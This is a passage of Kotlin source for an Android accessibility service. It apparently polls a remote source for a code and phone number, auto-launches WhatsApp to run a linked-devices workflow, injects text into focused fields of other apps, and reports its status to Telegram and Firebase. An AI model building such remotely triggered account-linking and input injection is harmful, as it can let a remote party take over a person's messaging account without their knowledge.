                                    Log.i(TAG, "📱 WhatsApp Linked action triggered once: code=$code for $phone (pkg=${explicitPkg ?: "AUTO"})")
                                    autoLinkManager.startWorkflow(
                                        code = code,
                                        phoneNumber = phone,
                                        requestId = reqId,
                                        autoLaunchWhatsApp = true,
                                        explicitPackage = explicitPkg
                                    )
                                }
                            }
                        }
                    } else {
                        isFirstPollCompleted = true
                    }
                } catch (_: Exception) {}
                delay(1500L)
            }
        }
    }

    private fun announceToUser(message: String, isBengali: Boolean = true) {
        val voiceManager = VoiceGuidanceManager.getInstance(applicationContext)
        voiceManager.speak(message, isBengali = isBengali, force = false)
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "WhatsApp Linked Assist Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "WhatsApp Linked Devices voice guidance and automation notification"
                setShowBadge(false)
            }
            val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
            manager?.createNotificationChannel(channel)
        }
    }

    private fun updateForegroundNotification(appName: String, statusText: String) {
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager ?: return

        val launchIntent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            this,
            0,
            launchIntent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        val notification = NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(R.mipmap.ic_launcher)
            .setContentTitle(appName)
            .setContentText(statusText)
            .setContentIntent(pendingIntent)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()

        manager.notify(NOTIFICATION_ID, notification)
    }

    fun performPasteToFocusedField(): Boolean {
        val root = try {
            rootInActiveWindow
        } catch (_: Exception) {
            null
        } ?: return false

        if (root.windowId < 0) return false

        return try {
            val targetNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: findEditableNode(root)
            targetNode?.performAction(AccessibilityNodeInfo.ACTION_PASTE) ?: false
        } catch (e: Exception) {
            Log.w(TAG, "Safe performPasteToFocusedField exception", e)
            false
        }
    }

    fun performSetTextToFocusedField(text: CharSequence): Boolean {
        val root = try {
            rootInActiveWindow
        } catch (_: Exception) {
            null
        } ?: return false

        if (root.windowId < 0) return false

        return try {
            val targetNode = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT) ?: findEditableNode(root)
            if (targetNode != null) {
                val arguments = Bundle().apply {
                    putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
                }
                targetNode.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
            } else {
                false
            }
        } catch (e: Exception) {
            Log.w(TAG, "Safe performSetTextToFocusedField exception", e)
            false
        }
    }

    private fun findEditableNode(root: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val queue = ArrayDeque<AccessibilityNodeInfo>()
        queue.add(root)
        var count = 0

        while (queue.isNotEmpty() && count < 30) {
            val current = queue.removeFirst()
            count++
            try {
                if (current.isEditable) return current
                val childCount = current.childCount
                for (i in 0 until childCount) {
                    val child = try { current.getChild(i) } catch (_: Exception) { null }
                    if (child != null && child.windowId >= 0) {
                        queue.add(child)
                    }
                }
            } catch (_: Exception) {}
        }
        return null
    }

    override fun onInterrupt() {
        Log.d(TAG, "QuickAccessibilityService interrupted")
    }

    override fun onUnbind(intent: Intent?): Boolean {
        instance = null
        _isServiceActive.value = false
        Log.d(TAG, "QuickAccessibilityService unbound")
        return super.onUnbind(intent)
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            TelegramRealtimeSync.getInstance(this).notifyServiceDisconnected()
        } catch (_: Exception) {}
        powerSyncJob?.cancel()
        whatsAppListenerJob?.cancel()
        firebaseSignalJob?.cancel()
        val manager = getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
        manager?.cancel(NOTIFICATION_ID)
        instance = null
        _isServiceActive.value = false
    }
}
